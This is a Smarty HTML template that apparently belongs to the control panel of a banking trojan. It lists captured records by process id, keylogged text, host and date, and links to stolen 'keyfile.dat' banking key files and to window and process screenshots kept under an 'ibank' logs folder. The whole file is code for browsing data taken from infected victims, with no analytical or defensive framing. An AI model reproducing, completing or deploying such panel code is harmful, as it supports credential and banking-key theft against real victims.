<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$title}';
</script>
{if $items|@count > 0}
<table cellspacing="2" cellpadding="0" class="t" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="t4" style="font-size:10px">
	<th style="width:5%;">pid</th>
    <th style="width:40%;">{$lang.keylog}</th>
    <th style="width:25%;">HOST / {$lang.date}</th>
    <th style="width:10%;">{$lang.keyfile}</th>
    <th style="width:10%;">{$lang.windscreen}</th>
    <th style="width:10%;">{$lang.procscreen}</th>
</tr>
{foreach from=$items item=item name=items}
{if $smarty.foreach.items.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
	<th>{$item->pid}</th>
    <th style="padding: 0px"><textarea class="bgp{$bg}" style="width:100%; padding: 0px; margin: 0px; border: 0px; resize: none; height: 60px; line-height: 20px; text-align:center; vertical-align:middle" readonly="readonly">{$item->keyhwnd}</textarea></th>
    <th>{$item->host}<br />{$item->post_date}</th>
    <th>{if file_exists("logs/ibank/`$item->grp`/keyfile.dat")}<a href="/logs/ibank/{$item->grp}/keyfile.dat" target="_blank">{$lang.dl}</a>{else}-{/if}</th>
    <th>{if file_exists("logs/ibank/`$item->grp`/windscreen.png")}<a href="/logs/ibank/{$item->grp}/windscreen.png" target="_blank">{$lang.show}</a>{else}-{/if}</th>
    <th>{if file_exists("logs/ibank/`$item->grp`/procscreen.png")}<a href="/logs/ibank/{$item->grp}/procscreen.png" target="_blank">{$lang.show}</a>{else}-{/if}</th>
</tr>
{/foreach}
</table>
{else}
<hr />
<h2 align="center">{$lang.notfound}</h2>
<hr />
{/if}